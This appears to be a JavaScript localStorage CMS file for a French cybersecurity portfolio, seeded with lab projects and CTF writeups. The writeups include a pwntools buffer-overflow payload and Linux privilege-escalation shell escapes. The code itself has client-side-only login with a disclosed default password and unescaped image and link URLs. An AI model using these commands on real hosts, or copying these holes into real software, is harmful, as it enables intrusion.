/* ============================================================
   store.js — localStorage CMS engine
   All content (projects, articles, writeups) lives here.
   ============================================================ */

'use strict';

const Store = (() => {

  /* ── Keys ── */
  const KEYS = {
    projects: 'cmsv1_projects',
    posts:    'cmsv1_posts',
    auth:     'cmsv1_auth',
    arsenal:  'cmsv1_arsenal',
    visits:   'cmsv1_visits',
    likes:    'cmsv1_likes',
    comments: 'cmsv1_comments',
  };

  /* ── Default password (SHA-256 of "cyber2024") ──
     Change via admin panel.                          */
  const DEFAULT_PASS_HASH = '17303e2814c6edc2a71afdd96d9d7e8e6d9b442a73444f2d11822160cd58a2c2';

  /* ── Internal helpers ── */
  function load(key, fallback = []) {
    try { return JSON.parse(localStorage.getItem(key)) ?? fallback; }
    catch { return fallback; }
  }
  function save(key, data) {
    localStorage.setItem(key, JSON.stringify(data));
  }
  function uid() {
    return Date.now().toString(36) + Math.random().toString(36).slice(2, 7);
  }
  async function sha256(str) {
    const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
    return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
  }

  /* ══════════════════════════════════════════════
     AUTH
     ══════════════════════════════════════════════ */
  function getPassHash() {
    return localStorage.getItem('cmsv1_passhash') || DEFAULT_PASS_HASH;
  }
  async function checkPassword(plain) {
    const h = await sha256(plain);
    return h === getPassHash();
  }
  async function setPassword(plain) {
    const h = await sha256(plain);
    localStorage.setItem('cmsv1_passhash', h);
  }
  function isLoggedIn() {
    const exp = parseInt(localStorage.getItem('cmsv1_session') || '0');
    return Date.now() < exp;
  }
  function login() {
    // session valid 8h
    localStorage.setItem('cmsv1_session', (Date.now() + 8 * 3600 * 1000).toString());
  }
  function logout() {
    localStorage.removeItem('cmsv1_session');
  }

  /* ══════════════════════════════════════════════
     PROJECTS
     Schema: { id, title, category, status, summary,
               tags[], content[], githubUrl, createdAt, updatedAt }
     content[] = array of blocks (see below)
     ══════════════════════════════════════════════ */
  function getProjects() { return load(KEYS.projects, SAMPLE_PROJECTS); }
  function saveProjects(arr) { save(KEYS.projects, arr); }
  function getProject(id) { return getProjects().find(p => p.id === id) || null; }

  function upsertProject(data) {
    const projects = getProjects();
    const idx = projects.findIndex(p => p.id === data.id);
    const now = new Date().toISOString();
    if (idx > -1) {
      projects[idx] = { ...projects[idx], ...data, updatedAt: now };
    } else {
      projects.unshift({ ...data, id: data.id || uid(), createdAt: now, updatedAt: now });
    }
    saveProjects(projects);
    return data.id || projects[0].id;
  }

  function deleteProject(id) {
    saveProjects(getProjects().filter(p => p.id !== id));
  }

  /* ══════════════════════════════════════════════
     POSTS (articles & writeups)
     Schema: { id, type('article'|'writeup'), title, category,
               excerpt, tags[], content[], coverEmoji,
               createdAt, updatedAt, published }
     ══════════════════════════════════════════════ */
  function getPosts()        { return load(KEYS.posts, SAMPLE_POSTS); }
  function savePosts(arr)    { save(KEYS.posts, arr); }
  function getPost(id)       { return getPosts().find(p => p.id === id) || null; }
  function getPublishedPosts(){ return getPosts().filter(p => p.published); }

  function upsertPost(data) {
    const posts = getPosts();
    const idx = posts.findIndex(p => p.id === data.id);
    const now = new Date().toISOString();
    if (idx > -1) {
      posts[idx] = { ...posts[idx], ...data, updatedAt: now };
    } else {
      posts.unshift({ ...data, id: data.id || uid(), createdAt: now, updatedAt: now });
    }
    savePosts(posts);
  }

  function deletePost(id) {
    savePosts(getPosts().filter(p => p.id !== id));
  }

  /* ══════════════════════════════════════════════
     CONTENT BLOCKS
     Each block: { type, ... }

     Types:
       text     → { text }            — rich paragraph
       heading  → { level, text }     — h2/h3/h4
       code     → { lang, code }      — syntax-highlighted
       image    → { src, caption }    — base64 or URL
       quote    → { text, source }    — blockquote
       divider  → {}                  — horizontal rule
       list     → { ordered, items[] }
       alert    → { kind, text }      — info/warning/danger
     ══════════════════════════════════════════════ */
  function renderBlock(block) {
    switch (block.type) {
      case 'heading':
        const tag = `h${block.level || 2}`;
        return `<${tag} class="content-heading lv${block.level || 2}">${escHtml(block.text)}</${tag}>`;

      case 'text':
        return `<p class="content-text">${parseInline(block.text)}</p>`;

      case 'code':
        return `<div class="content-code-block">
          <div class="code-hdr"><span>${escHtml(block.lang || 'code')}</span>
            <button class="copy-btn btn btn-sm btn-ghost" onclick="copyBlock(this)">Copy</button>
          </div>
          <pre><code class="lang-${escHtml(block.lang || 'text')}">${escHtml(block.code)}</code></pre>
        </div>`;

      case 'image':
        return `<figure class="content-image">
          <img src="${block.src}" alt="${escHtml(block.caption || '')}" loading="lazy"/>
          ${block.caption ? `<figcaption>${escHtml(block.caption)}</figcaption>` : ''}
        </figure>`;

      case 'quote':
        return `<blockquote class="content-quote">
          <p>${parseInline(block.text)}</p>
          ${block.source ? `<cite>— ${escHtml(block.source)}</cite>` : ''}
        </blockquote>`;

      case 'divider':
        return `<hr class="content-divider"/>`;

      case 'list':
        const li = block.items.map(i => `<li>${parseInline(i)}</li>`).join('');
        return block.ordered
          ? `<ol class="content-list">${li}</ol>`
          : `<ul class="content-list">${li}</ul>`;

      case 'alert':
        return `<div class="content-alert alert-${block.kind || 'info'}">
          <span class="alert-icon">${alertIcon(block.kind)}</span>
          <span>${parseInline(block.text)}</span>
        </div>`;

      default: return '';
    }
  }

  function alertIcon(k) {
    return { info:'ℹ', warning:'⚠', danger:'⛔', success:'✓' }[k] || 'ℹ';
  }

  function escHtml(s = '') {
    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
  }

  // Inline markdown: **bold**, `code`, *italic*, [link](url)
  function parseInline(s = '') {
    return escHtml(s)
      .replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')
      .replace(/\*(.+?)\*/g,     '<em>$1</em>')
      .replace(/`(.+?)`/g,       '<code class="inline-code">$1</code>')
      .replace(/\[(.+?)\]\((.+?)\)/g, '<a href="$2" target="_blank" rel="noopener" class="content-link">$1</a>');
  }

  function renderBlocks(blocks = []) {
    return blocks.map(renderBlock).join('\n');
  }

    /* DATA: Diallo Mouhamadou Saidou (0xSaidoss) */
  const SAMPLE_PROJECTS = [
    {
      id: 'proj_001',
      title: 'SOC Lab \u2014 Suricata IDS + Wazuh SIEM',
      category: 'lab',
      status: 'complete',
      summary: "Mise en place d'un IDS (Suricata) et d'un SIEM (Wazuh) pour la d\u00e9tection et la r\u00e9ponse aux incidents de mani\u00e8re centralis\u00e9e.",
      tags: ['Suricata','Wazuh','Ubuntu','VMware','SIEM'],
      githubUrl: '',
      coverEmoji: '\ud83d\udee1\ufe0f',
      content: [
        { type: 'heading', level: 2, text: 'Objectif' },
        { type: 'text', text: "Construire un **SOC miniature** fonctionnel : Suricata comme IDS/IPS, Wazuh comme SIEM. D\u00e9tection en temps r\u00e9el et centralisation des logs." },
        { type: 'heading', level: 2, text: 'Architecture' },
        { type: 'list', ordered: false, items: ['VM Attaquant : Kali Linux','VM IDS : Ubuntu + Suricata','VM Cible : Ubuntu Server','VM SIEM : Wazuh Manager + Dashboard','R\u00e9seau VMware Host-Only'] },
        { type: 'heading', level: 3, text: 'R\u00e8gle Suricata' },
        { type: 'code', lang: 'suricata', code: 'alert tcp any any -> $HOME_NET 22 (\n  msg:"SSH Brute Force Detected";\n  threshold: type threshold, track by_src,\n             count 5, seconds 60;\n  classtype:attempted-admin;\n  sid:9000001; rev:1;\n)' },
        { type: 'alert', kind: 'success', text: 'Lab fonctionnel : d\u00e9tection de scans nmap, brute-force SSH, et payloads Metasploit en temps r\u00e9el.' },
      ],
      createdAt: '2025-03-01T10:00:00Z',
      updatedAt: '2025-03-01T10:00:00Z',
    },
    {
      id: 'proj_002',
      title: 'Simulation R\u00e9seau Complexe \u2014 GNS3',
      category: 'network',
      status: 'complete',
      summary: "Mise en place d'architectures r\u00e9seau r\u00e9alistes sur GNS3 : DHCP, NAT, DNS, IPV6, VMware, Windows Server, EtherChannel, TFTP, NTP, OSPF, EIGRP.",
      tags: ['GNS3','OSPF','EIGRP','DHCP','NAT','IPV6','Windows Server'],
      githubUrl: '',
      coverEmoji: '\ud83c\udf10',
      content: [
        { type: 'heading', level: 2, text: 'Description' },
        { type: 'text', text: "Simulation compl\u00e8te d'un r\u00e9seau d'entreprise multi-sites dans GNS3 avec routeurs Cisco, Windows Server, et connectivit\u00e9 IPv4/IPv6 dual-stack." },
        { type: 'heading', level: 2, text: 'Services configur\u00e9s' },
        { type: 'list', ordered: false, items: ['DHCP centralis\u00e9 avec relais sur plusieurs VLANs','NAT44 overload sur routeur de bordure','DNS interne zones forward/reverse','IPV6 SLAAC et DHCPv6','EtherChannel (LACP)','NTP sur Windows Server','TFTP pour sauvegarde configs Cisco'] },
        { type: 'code', lang: 'cisco', code: 'router ospf 1\n router-id 1.1.1.1\n network 192.168.0.0 0.0.255.255 area 0\n!\nrouter eigrp 100\n network 172.16.0.0 0.0.255.255\n no auto-summary' },
        { type: 'alert', kind: 'info', text: 'Topologie valid\u00e9e avec plus de 15 \u00e9quipements virtuels simultan\u00e9s.' },
      ],
      createdAt: '2025-01-15T10:00:00Z',
      updatedAt: '2025-01-15T10:00:00Z',
    },
    {
      id: 'proj_003',
      title: 'VPN S\u00e9curis\u00e9 \u2014 OpenVPN',
      category: 'tool',
      status: 'complete',
      summary: "D\u00e9ploiement d'un serveur OpenVPN avec PKI Easy-RSA pour connecter de mani\u00e8re chiffr\u00e9e un client distant \u00e0 un r\u00e9seau d'entreprise simul\u00e9.",
      tags: ['OpenVPN','PKI','Linux','TLS','AES-256'],
      githubUrl: '',
      coverEmoji: '\ud83d\udd10',
      content: [
        { type: 'heading', level: 2, text: 'Objectif' },
        { type: 'text', text: "Tunnel **VPN chiffr\u00e9** entre Kali (client) et Ubuntu (serveur), avec PKI maison Easy-RSA et chiffrement AES-256-GCM." },
        { type: 'list', ordered: false, items: ["G\u00e9n\u00e9ration CA avec Easy-RSA","Certificats serveur et clients","TLS-auth contre DDoS","V\u00e9rification Wireshark : trafic chiffr\u00e9"] },
        { type: 'code', lang: 'bash', code: '# Test connexion VPN\nip route show | grep tun0\n# 10.8.0.0/24 dev tun0\ncurl ifconfig.me  # IP du serveur VPN' },
      ],
      createdAt: '2025-02-10T10:00:00Z',
      updatedAt: '2025-02-10T10:00:00Z',
    },
    {
      id: 'proj_004',
      title: '100+ Machines TryHackMe \u2014 0xSaidoss',
      category: 'ctf',
      status: 'complete',
      summary: "100+ machines r\u00e9solues sur TryHackMe depuis d\u00e9cembre 2024 : s\u00e9curit\u00e9 r\u00e9seau, OWASP Top 10, Privilege Escalation, Kali Linux.",
      tags: ['TryHackMe','CTF','PrivEsc','OWASP','Kali Linux'],
      githubUrl: '',
      coverEmoji: '\ud83d\udea9',
      content: [
        { type: 'heading', level: 2, text: 'Parcours TryHackMe \u2014 0xSaidoss' },
        { type: 'text', text: '**100+ machines** r\u00e9solues depuis d\u00e9cembre 2024. Paths : Pre-Security, Junior Penetration Tester, SOC Level 1.' },
        { type: 'list', ordered: false, items: ['S\u00e9curit\u00e9 r\u00e9seau : Nmap, Wireshark','Kali Linux et outils offensifs','OWASP Top 10 : SQLi, XSS, SSRF, IDOR','Privilege Escalation Linux/Windows','S\u00e9curit\u00e9 des applications web'] },
        { type: 'alert', kind: 'info', text: 'Profil public : 0xSaidoss sur TryHackMe' },
      ],
      createdAt: '2024-12-07T10:00:00Z',
      updatedAt: '2025-03-01T10:00:00Z',
    },
    {
      id: 'proj_005',
      title: '15+ Challenges Binary Exploitation \u2014 Root-Me PRO',
      category: 'ctf',
      status: 'complete',
      summary: "15+ challenges de Binary Exploitation sur Root-Me PRO : Stack overflow, Heap, Format String, Race condition, Double free, ELF x86/x64.",
      tags: ['Root-Me','Binary Exploitation','C','GHIDRA','GDB-GEF'],
      githubUrl: '',
      coverEmoji: '\ud83d\udc80',
      content: [
        { type: 'heading', level: 2, text: 'Root-Me PRO \u2014 App/System' },
        { type: 'text', text: 'Sp\u00e9cialisation **Binary Exploitation** depuis juillet 2025. Outils : GHIDRA, IDA, GDB-GEF. Langage : C.' },
        { type: 'list', ordered: true, items: ['Architecture x86 & x64','ELF x86 - BSS buffer overflow','ELF x64 - Stack buffer overflow (PIE)','ELF x86 - Format string bug','ELF x64 - Basic heap overflow','ELF x64 - Double free','ELF x86 - Use After Free','ELF x86 - Race condition'] },
        { type: 'code', lang: 'python', code: 'from pwn import *\np = process(\'./challenge\')\npayload = b\'A\' * 72 + p32(0x080491b6)\np.sendline(payload)\np.interactive()' },
        { type: 'alert', kind: 'warning', text: 'Challenges r\u00e9alis\u00e9s dans un cadre l\u00e9gal sur Root-Me PRO.' },
      ],
      createdAt: '2025-07-01T10:00:00Z',
      updatedAt: '2025-03-01T10:00:00Z',
    },
  ];

  const SAMPLE_POSTS = [
    {
      id: 'post_001',
      type: 'article',
      published: true,
      title: "Mon parcours : de z\u00e9ro \u00e0 100+ machines TryHackMe",
      category: 'Parcours',
      coverEmoji: '\ud83d\ude80',
      excerpt: "Comment j'ai d\u00e9couvert la cybers\u00e9curit\u00e9 en premi\u00e8re sans ordinateur et progress\u00e9 jusqu'\u00e0 me sp\u00e9cialiser en Binary Exploitation.",
      tags: ['TryHackMe','Parcours','Binary Exploitation','Kali Linux'],
      content: [
        { type: 'heading', level: 2, text: 'Le d\u00e9but \u2014 sans ordinateur' },
        { type: 'text', text: "D\u00e9couverte de la cybers\u00e9curit\u00e9 en **premi\u00e8re** en C\u00f4te d'Ivoire. Pas d'ordinateur. Apprentissage depuis mon t\u00e9l\u00e9phone : vid\u00e9os YouTube, documentation, forums." },
        { type: 'heading', level: 2, text: 'Le 7 d\u00e9cembre 2024' },
        { type: 'text', text: "Premier PC. Installation d'**Ubuntu** en VM, puis dual-boot **Kali Linux**. Inscription sur TryHackMe sous **0xSaidoss**." },
        { type: 'heading', level: 2, text: 'La d\u00e9couverte : Binary Exploitation' },
        { type: 'text', text: "Via les CTF, d\u00e9couverte de la **Binary Exploitation** et du **Reverse Engineering**. Apprentissage du C depuis *The C Programming Language* et pratique sur Root-Me PRO." },
        { type: 'heading', level: 2, text: 'We.Code \u2014 D\u00e9cembre 2025' },
        { type: 'text', text: "Int\u00e9gration du programme **We.Code** (GIZ, EPITECH, M-Studio) en parall\u00e8le du BTS R\u00e9seaux & T\u00e9l\u00e9communications." },
        { type: 'alert', kind: 'success', text: "100+ machines THM \u00b7 15+ challenges Root-Me BinExp \u00b7 Labs SOC (Suricata+Wazuh) \u00b7 GNS3 multi-sites" },
      ],
      createdAt: '2025-03-01T09:00:00Z',
      updatedAt: '2025-03-01T09:00:00Z',
    },
    {
      id: 'post_002',
      type: 'writeup',
      published: true,
      title: 'Writeup Root-Me \u2014 ELF x86 Stack Buffer Overflow',
      category: 'Root-Me',
      coverEmoji: '\ud83d\udca5',
      excerpt: "Exploitation d'un buffer overflow ELF x86 : GHIDRA, calcul offset GDB-GEF, payload pwntools.",
      tags: ['Root-Me','Binary Exploitation','Buffer Overflow','x86','GHIDRA','pwntools'],
      content: [
        { type: 'heading', level: 2, text: 'Analyse avec GHIDRA' },
        { type: 'code', lang: 'c', code: '// Code d\u00e9compil\u00e9\nvoid vuln(void) {\n  char local_48 [64];\n  gets(local_48);  // VULNERABLE\n}' },
        { type: 'heading', level: 2, text: "Offset avec GDB-GEF" },
        { type: 'code', lang: 'bash', code: 'gef> pattern create 100\ngef> run\ngef> pattern offset $eip\n# Found at offset 72' },
        { type: 'heading', level: 2, text: 'Payload pwntools' },
        { type: 'code', lang: 'python', code: 'from pwn import *\np = process(\'./challenge\')\npayload = b\'A\' * 72 + p32(0x080491b6)\np.sendline(payload)\np.interactive()' },
        { type: 'alert', kind: 'success', text: "Flag obtenu ! Redirection vers win() par \u00e9crasement de l'adresse de retour." },
      ],
      createdAt: '2025-02-05T14:00:00Z',
      updatedAt: '2025-02-05T14:00:00Z',
    },
    {
      id: 'post_003',
      type: 'writeup',
      published: true,
      title: 'Writeup TryHackMe \u2014 Privilege Escalation Linux',
      category: 'TryHackMe',
      coverEmoji: '\u2b06\ufe0f',
      excerpt: 'Les 3 principaux vecteurs de PrivEsc Linux : SUID, sudo -l, Cron Jobs. Avec commandes et exemples concrets.',
      tags: ['TryHackMe','PrivEsc','Linux','SUID','sudo','GTFOBins'],
      content: [
        { type: 'heading', level: 2, text: '\u00c9num\u00e9ration' },
        { type: 'code', lang: 'bash', code: 'find / -perm -u=s -type f 2>/dev/null\nsudo -l\ncat /etc/crontab' },
        { type: 'heading', level: 2, text: 'SUID' },
        { type: 'code', lang: 'bash', code: 'find . -exec /bin/sh -p \\; -quit' },
        { type: 'heading', level: 2, text: 'sudo -l' },
        { type: 'code', lang: 'bash', code: 'sudo vim -c ":!/bin/bash"' },
        { type: 'heading', level: 2, text: 'Cron Jobs' },
        { type: 'code', lang: 'bash', code: 'echo "chmod +s /bin/bash" >> /opt/script.sh\nbash -p' },
        { type: 'alert', kind: 'info', text: 'R\u00e9f\u00e9rence : GTFOBins \u2014 liste exhaustive des binaires exploitables.' },
      ],
      createdAt: '2025-01-20T14:00:00Z',
      updatedAt: '2025-01-20T14:00:00Z',
    },
  ];


  /* ══════════════════════════════════════════════
     ARSENAL TECHNIQUE
     Schema: [{ id, name, icon, skills:[{name,pct}], tags[] }]
     ══════════════════════════════════════════════ */
  const SAMPLE_ARSENAL = [
    { id:'ars_001', name:'Binary Exploitation & RE', icon:'💀',
      skills:[{name:'Binary Exploitation (C)',pct:80},{name:'Reverse Engineering',pct:72},{name:'Langage C',pct:68},{name:'GHIDRA / IDA / GDB-GEF',pct:74}],
      tags:['Stack Overflow','Heap','Format String','AV Bypass','ELF x86/x64','Race Condition'] },
    { id:'ars_002', name:'Réseaux', icon:'🌐',
      skills:[{name:'TCP/IP, DHCP, DNS, NAT, IPV6',pct:85},{name:'OSPF, EIGRP, RIPV2',pct:80},{name:'VLAN, Routing, Switching',pct:82},{name:'GNS3 (Simulation)',pct:85}],
      tags:['GNS3','OpenVPN','Fibre Optique','Windows Server'] },
    { id:'ars_003', name:'SOC & Défense', icon:'🛡️',
      skills:[{name:'Suricata IDS/IPS',pct:78},{name:'Wazuh SIEM',pct:75},{name:'Firewalls / UFW / IPTables',pct:78},{name:'Détection des menaces',pct:76}],
      tags:['Suricata','Wazuh','Nmap','Burp Suite','John the Ripper'] },
    { id:'ars_004', name:'Linux & Scripting', icon:'🐧',
      skills:[{name:'Kali Linux',pct:88},{name:'Ubuntu / CentOS',pct:82},{name:'Bash Scripting',pct:78},{name:'Python',pct:70}],
      tags:['Kali','Ubuntu','VMware','MySQL','SQLite3'] },
    { id:'ars_005', name:'Web & CTF', icon:'🚩',
      skills:[{name:'OWASP Top 10',pct:75},{name:'Sécurité Web',pct:72},{name:'Privilege Escalation',pct:82},{name:'SQL (MySQL, SQLite3)',pct:68}],
      tags:['TryHackMe','Root-Me','SQLi','XSS','SSRF'] },
  ];

  function getArsenal() {
    let arr = null;
    try { arr = JSON.parse(localStorage.getItem(KEYS.arsenal)); } catch {}
    if (!arr) {
      // First load: persist samples so they become editable
      save(KEYS.arsenal, SAMPLE_ARSENAL);
      return SAMPLE_ARSENAL;
    }
    return arr;
  }
  function saveArsenal(arr)   { save(KEYS.arsenal, arr); }
  function upsertArsenalCat(data) {
    const arr = getArsenal();
    const idx = arr.findIndex(c => c.id === data.id);
    if (idx > -1) { arr[idx] = { ...arr[idx], ...data }; }
    else          { arr.push({ ...data, id: data.id || uid() }); }
    saveArsenal(arr);
  }
  function deleteArsenalCat(id) { saveArsenal(getArsenal().filter(c => c.id !== id)); }

  /* ══════════════════════════════════════════════
     LIKES
     ══════════════════════════════════════════════ */
  function getLikes(projectId) {
    const all = load(KEYS.likes, {});
    return (all[projectId] || []).length;
  }
  function hasLiked(projectId) {
    const fingerprint = _getFingerprint();
    const all = load(KEYS.likes, {});
    return (all[projectId] || []).includes(fingerprint);
  }
  function toggleLike(projectId) {
    const fp = _getFingerprint();
    let all = load(KEYS.likes, {});
    if (!all[projectId]) all[projectId] = [];
    const idx = all[projectId].indexOf(fp);
    if (idx > -1) { all[projectId].splice(idx, 1); save(KEYS.likes, all); return false; }
    else          { all[projectId].push(fp);        save(KEYS.likes, all); return true;  }
  }
  function _getFingerprint() {
    let fp = localStorage.getItem('cmsv1_fp');
    if (!fp) { fp = Math.random().toString(36).slice(2) + Date.now().toString(36); localStorage.setItem('cmsv1_fp', fp); }
    return fp;
  }

  /* ══════════════════════════════════════════════
     COMMENTS
     Schema per project: [{ id, author, text, createdAt }]
     ══════════════════════════════════════════════ */
  function getComments(projectId) {
    const all = load(KEYS.comments, {});
    return all[projectId] || [];
  }
  function addComment(projectId, data) {
    let all = load(KEYS.comments, {});
    if (!all[projectId]) all[projectId] = [];
    all[projectId].push({ id: uid(), author: data.author, text: data.text, createdAt: new Date().toISOString() });
    save(KEYS.comments, all);
  }
  function deleteComment(projectId, commentId) {
    let all = load(KEYS.comments, {});
    if (all[projectId]) { all[projectId] = all[projectId].filter(c => c.id !== commentId); save(KEYS.comments, all); }
  }


  /* ══════════════════════════════════════════════
     VISITS TRACKING
     ══════════════════════════════════════════════ */
  function recordVisit() {
    // Ne pas compter les visites de l'admin
    if (isLoggedIn()) return;
    const fp = _getFingerprint();
    const today = new Date().toISOString().slice(0,10);
    let data = load(KEYS.visits, { total: 0, daily: {}, unique: [] });
    // Total
    data.total = (data.total || 0) + 1;
    // Daily
    if (!data.daily) data.daily = {};
    data.daily[today] = (data.daily[today] || 0) + 1;
    // Unique (by fingerprint)
    if (!data.unique) data.unique = [];
    if (!data.unique.includes(fp)) data.unique.push(fp);
    // Keep only last 30 days
    const cutoff = new Date(); cutoff.setDate(cutoff.getDate() - 30);
    Object.keys(data.daily).forEach(d => { if (new Date(d) < cutoff) delete data.daily[d]; });
    save(KEYS.visits, data);
    return data;
  }
  function getVisits() {
    return load(KEYS.visits, { total: 0, daily: {}, unique: [] });
  }
  function getTodayVisits() {
    const today = new Date().toISOString().slice(0,10);
    return (getVisits().daily || {})[today] || 0;
  }

  /* ── Public API ── */
  return {
    uid,
    /* auth */
    checkPassword, setPassword, isLoggedIn, login, logout,
    /* projects */
    getProjects, getProject, upsertProject, deleteProject,
    /* posts */
    getPosts, getPost, getPublishedPosts, upsertPost, deletePost,
    /* arsenal */
    getArsenal, saveArsenal, upsertArsenalCat, deleteArsenalCat,
    /* likes */
    getLikes, hasLiked, toggleLike,
    /* comments */
    getComments, addComment, deleteComment,
    /* visits */
    recordVisit, getVisits, getTodayVisits,
    /* render */
    renderBlocks, renderBlock, escHtml, parseInline,
  };
})();

/* Global copy helper */
function copyBlock(btn) {
  const code = btn.closest('.content-code-block').querySelector('code').textContent;
  navigator.clipboard.writeText(code).then(() => {
    btn.textContent = 'Copied!';
    setTimeout(() => btn.textContent = 'Copy', 2000);
  });
}
